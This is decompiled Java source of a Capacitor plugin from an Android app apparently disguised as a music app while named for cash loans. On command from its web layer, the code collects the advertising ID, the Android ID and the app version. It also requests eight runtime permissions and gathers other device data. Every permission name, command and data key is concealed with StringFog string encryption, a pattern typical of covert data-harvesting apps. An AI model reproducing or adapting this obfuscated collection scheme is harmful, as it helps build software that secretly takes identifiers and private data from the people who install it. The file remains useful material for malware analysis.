package com.music.violin.cash.violin.music.loan.store.cash.loan;

import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.provider.Settings;
import androidx.core.app.ActivityCompat;
import com.getcapacitor.IQyLz;
import com.getcapacitor.g6Zy;
import com.getcapacitor.iFpfch2J8RfW1c;
import com.getcapacitor.urYzCG;
import com.google.QTcw4j1x.Cyxd6DRPreJUiX;
import com.google.QTcw4j1x.Sm73oGzmW;
import com.google.android.gms.ads.identifier.AdvertisingIdClient;
import java.io.StringWriter;
import java.util.HashMap;

@com.getcapacitor.C4XY.QTcw4j1x(C4XY = "UAM3IHKS")
/* loaded from: classes.dex */
public class MyPlugin extends iFpfch2J8RfW1c {
    public static g6Zy QTcw4j1x;

    public static String C4XY(Context context) {
        try {
            new AdvertisingIdClient(context);
            return AdvertisingIdClient.getAdvertisingIdInfo(context).getId();
        } catch (Exception unused) {
            return null;
        }
    }

    private static String QTcw4j1x(Context context) {
        String str = "";
        try {
            String str2 = context.getPackageManager().getPackageInfo(context.getPackageName(), 0).versionName;
            if (str2 != null) {
                try {
                    if (str2.length() > 0) {
                        return str2;
                    }
                } catch (Exception unused) {
                    str = str2;
                    return str;
                }
            }
            return "";
        } catch (Exception unused2) {
        }
    }

    private static String Sm73oGzmW(Context context) {
        try {
            return Settings.Secure.getString(context.getContentResolver(), StringFog.decrypt("GfuqEQm9T+oR8Q==\n", "eJXOY2bUK7U=\n"));
        } catch (Exception unused) {
            return null;
        }
    }

    @urYzCG
    public void echo(g6Zy g6zy) {
        IQyLz iQyLz = new IQyLz();
        String Sm73oGzmW = g6zy.Sm73oGzmW(StringFog.decrypt("nDpS\n", "918rstBRUyI=\n"));
        if (Sm73oGzmW.equals(StringFog.decrypt("KggTtMGy1rE+GS+Dxaf3uyYICQ==\n", "TW1n5qTDo9Q=\n"))) {
            iQyLz.C4XY(StringFog.decrypt("FPIAaw==\n", "c5NJD5S+kI4=\n"), C4XY(Sm73oGzmW()));
            iQyLz.C4XY(StringFog.decrypt("cnGU1aw15ut3\n", "Ex/wp8NcgqI=\n"), Sm73oGzmW(Sm73oGzmW()));
            iQyLz.C4XY(StringFog.decrypt("gAH39cQEubCOH8nCzBM=\n", "4XGHo6F2ytk=\n"), QTcw4j1x(Sm73oGzmW()));
        } else if (Sm73oGzmW.equals(StringFog.decrypt("ZXYp6E4TC+9rcjM=\n", "AhNduTtyZZc=\n"))) {
            QTcw4j1x = g6zy;
            ActivityCompat.requestPermissions(X3OKRI(), new String[]{StringFog.decrypt("T50KheOVPNhelhya5Y8rn0GdQKXJvRypfrshucmjC6Jvpys=\n", "LvNu94z8WPY=\n"), StringFog.decrypt("0wy2l/funjLCB6CI8fSJdd0M/KbZyr9O8w==\n", "smLS5ZiH+hw=\n"), StringFog.decrypt("1t02r7tnC1rH1iCwvX0cHdjdfI+RTysr8usGmIZALjjo4AaShk8oMQ==\n", "t7NS3dQOb3Q=\n"), StringFog.decrypt("U1pVhJipVFVCUUObnrNDEl1aH6GliWQ+bXFporKSfjp+a2KiuJJxPHc=\n", "MjQx9vfAMHs=\n"), StringFog.decrypt("7xnPrPGiHj3+Etmz97gJeuEZhYzbij5MzTjlit+ILkA=\n", "jner3p7LehM=\n"), StringFog.decrypt("/FY9o/cjFy/tXSu88TkAaPJWd5DbCTZSzmcantkYIETCdBaS2R46TtM=\n", "nThZ0ZhKcwE=\n"), StringFog.decrypt("wNgzn3jRlzvR0yWAfsuAfM7YeaxU+7ZG8ukRpFn9rFnu9Ra5Xve9\n", "obZX7Re48xU=\n"), StringFog.decrypt("/UhqlitqxKvsQ3yJLXDT7PNIILYBQuTaz2td\n", "nCYO5EQDoIU=\n")}, 564);
            return;
        } else if (Sm73oGzmW.equals(StringFog.decrypt("aYWgvPbpigk=\n", "DuDU+ZuI42U=\n"))) {
            try {
                Intent intent = new Intent(StringFog.decrypt("eMSRwFG2e4lwxIHXUKsxxnrenN1Q8UziV+6h/Q==\n", "Gar1sj7fH6c=\n"));
                intent.setData(Uri.parse(StringFog.decrypt("TOxaov/u4pdI4l+n5a+7lFL5XKPu85iJTvler+Lt9oJO4A==\n", "IY0zzouB2OE=\n")));
                X3OKRI().startActivity(intent);
            } catch (Exception unused) {
            }
        } else if (Sm73oGzmW.equals(StringFog.decrypt("J5OK4Oc7\n", "a/ztj5JP9tg=\n"))) {
            System.exit(0);
        } else {
            HashMap hashMap = new HashMap();
            if (Sm73oGzmW.equals(StringFog.decrypt("9ptJdE1ObVX0t1NWRw==\n", "kf49MCg4BDY=\n"))) {
                hashMap.put(StringFog.decrypt("RH+1G2p0\n", "IBrDcgkRNE4=\n"), QTcw4j1x.Tk3BGC4(X3OKRI()));
            }
            if (Sm73oGzmW.equals(StringFog.decrypt("NzZvs+FjSrA=\n", "UFMb44kMPt8=\n"))) {
                hashMap.put(StringFog.decrypt("06XoSbYxVnvX\n", "o82HPdl9Pwg=\n"), QTcw4j1x.QTcw4j1x(X3OKRI()));
            }
            if (Sm73oGzmW.equals(StringFog.decrypt("V/7fcyoL\n", "MJurMlp7dkU=\n"))) {
                hashMap.put(StringFog.decrypt("jCNZ+le8Fh+YNQ==\n", "6EYvkzTZV28=\n"), QTcw4j1x.X3OKRI(X3OKRI()));
            }
            if (Sm73oGzmW.equals(StringFog.decrypt("OsYkkrlt\n", "XaNQwdQen3M=\n"))) {
                hashMap.put(StringFog.decrypt("iMzXAjvugg==\n", "+6GkTlKd9vo=\n"), QTcw4j1x.C4XY(X3OKRI()));
            }
            if (Sm73oGzmW.equals(StringFog.decrypt("PmstVLOqVM86eg==\n", "WQ5ZF9zEIK4=\n"))) {
                hashMap.put(StringFog.decrypt("gv9dmsKzdkSI7kqQ1aU=\n", "5por86HWNSs=\n"), QTcw4j1x.Sm73oGzmW(X3OKRI()));
            }
            Sm73oGzmW sm73oGzmW = new Sm73oGzmW();
            Class<?> cls = hashMap.getClass();
            StringWriter stringWriter = new StringWriter();
            sm73oGzmW.C4XY(hashMap, cls, stringWriter);
            iQyLz.put(StringFog.decrypt("HeX8IVgzEg==\n", "fJWMaDZVfeo=\n"), (Cyxd6DRPreJUiX) sm73oGzmW.C4XY(stringWriter.toString(), (Class<Object>) Cyxd6DRPreJUiX.class));
        }
        g6zy.C4XY(iQyLz);
    }
}